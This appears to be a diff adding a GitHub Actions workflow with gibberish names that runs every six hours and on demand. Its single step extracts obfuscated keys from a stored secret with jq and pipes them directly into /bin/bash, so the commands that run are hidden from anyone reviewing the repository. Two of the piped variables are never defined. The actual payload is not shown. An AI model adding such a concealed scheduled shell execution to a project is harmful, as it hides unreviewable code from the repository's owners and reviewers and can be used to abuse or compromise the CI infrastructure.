@@ -1,0 +1,20 @@
+name: huoshuobadaooo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huoshuobadaooo
+        env:
+          fesi828: ${{ secrets.fesi828 }}
+        run: |
+          echo $fesi828 | jq -r .fwaj83126 | /bin/bash
+          echo $sp439 | jq -r .bzglk19777 | /bin/bash
+          echo $cql40540 | jq -r .xoew47 | /bin/bash
+
